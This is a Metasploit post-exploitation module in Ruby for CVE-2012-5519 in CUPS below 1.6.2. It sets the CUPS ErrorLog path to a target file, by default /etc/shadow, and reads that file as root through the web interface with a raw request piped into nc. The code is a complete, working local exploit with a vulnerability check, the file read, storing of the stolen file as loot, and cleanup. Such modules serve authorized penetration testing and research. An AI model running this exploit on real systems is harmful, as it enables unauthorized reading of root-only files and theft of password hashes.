##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Post
	include Msf::Post::File
	include Msf::Post::Common

	LP_GROUPS = ['lpadmin', '_lpadmin']
	CTL_PATH = '/usr/sbin/cupsctl'

	attr_accessor :web_server_was_disabled, :error_log_was_reset

	def initialize(info={})
		super( update_info( info, {
			'Name'           => 'CUPS 1.6.1 Root File Read',
			'Description'    => %q{
				This module exploits a vulnerability in CUPS < 1.6.2, an open source printing system.
				CUPS allows members of the lpadmin group to make changes to the cupsd.conf
				configuration, which can specify an Error Log path. When the user visits the
				Error Log page in the web interface, the cupsd daemon (running with setuid root)
				reads the Error Log path and echoes it as plaintext.

				This module is known to work on:
				
				- Mac OS X < 10.8.4
				- Ubuntu Desktop <= 12.0.4

				...as long as the session is in the lpadmin group.

				Note: This might also work as a root write exploit, if you can ignore the log
				formatting. The page_log (PageLog= directive) would be useful for ths.
			},
			'References'     =>
				[
					['CVE', '2012-5519'],
					['OSVDB', '87635'],
					['URL', 'http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791']
				],
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					"Jann Horn", # discovery
					"joev <jvennix[at]rapid7.com>" # metasploit module
				],
			'DisclosureDate' => 'Nov 20 2012',
			'Platform'       => ['osx', 'linux']
		}))
		register_options([
			OptString.new("FILE", [true, "The file to steal.", "/etc/shadow"])
		], self.class)
	end

	def check
		user = cmd_exec("whoami")
		user_groups = cmd_exec("groups #{[user].shelljoin}").split(/\s+/)
		if (user_groups & LP_GROUPS).empty?
			print_error "User not in lpadmin group."
			return Msf::Exploit::CheckCode::Safe
		else
			print_good "User in lpadmin group, continuing..."
		end

		if cmd_exec("whereis cupsctl").blank?
			print_error "cupsctl binary not found in $PATH"
			return Msf::Exploit::CheckCode::Safe
		end

		config_path = cmd_exec("whereis cups-config")
		config_vn = nil

		if not config_path.blank?
			# cups-config not present, ask the web interface what vn it is
			output = get_request('/')
			if output =~ /title.*CUPS\s+([\d\.]+)/i
				print_status "Found CUPS #{$1}"
				config_vn = $1.strip
			else
				print_error "Could not determine CUPS version."
				return Msf::Exploit::CheckCode::Unknown
			end
		else
			config_vn = cmd_exec("cups-config --version").strip # use cups-config if installed
		end

		config_parts = config_vn.split('.')
		if config_vn.to_f < 1.6 or (config_vn.to_f <= 1.6 and config_parts[2].to_i < 2) # <1.6.2
			Msf::Exploit::CheckCode::Vulnerable
		else
			Msf::Exploit::CheckCode::Safe
		end
	end

	def run
		if check == Msf::Exploit::CheckCode::Safe
			print_error "Target machine not vulnerable, bailing."
			return
		end

		defaults = cmd_exec(CTL_PATH)
		@web_server_was_disabled = defaults =~ /^WebInterface=no$/i

		# first we set the error log to the path intended
		puts cmd_exec("#{CTL_PATH} ErrorLog=#{datastore['FILE']}")
		puts cmd_exec("#{CTL_PATH} WebInterface=yes")
		@error_log_was_reset = true

		# now we go grab it from the ErrorLog route
		file = strip_http_headers(get_request('/admin/log/error_log'))

		# and store as loot
		l = store_loot('cups_file_read', 'application/octet-stream', session, file,
		               File.basename(datastore['FILE']))
		print_good("File #{datastore['FILE']} (#{file.length} bytes) saved to #{l}")
	end

	def cleanup
		return if @cleanup_up # once!
		@cleaning_up = true

		print_status "Cleaning up..."
		rm_f(tmp_path)
		cmd_exec("#{CTL_PATH} WebInterface=no") if web_server_was_disabled
		# ErrorLog default is distro-dependent, just unset it
		cmd_exec("#{CTL_PATH} ErrorLog=") if error_log_was_reset
		super
	end

	private

	def strip_http_headers(http); http.gsub(/\A(^.*\r\n)*/, ''); end
	def tmp_path; @tmp_path ||= "/tmp/#{Rex::Text.rand_text_alpha(12+rand(8))}"; end

	def get_request(uri)
		rm_f(tmp_path)
		write_file(tmp_path, "GET #{uri}\n\r\n\r")
		cmd_exec(['cat', tmp_path, '|', 'nc localhost 631'].join(' '))
	end
end
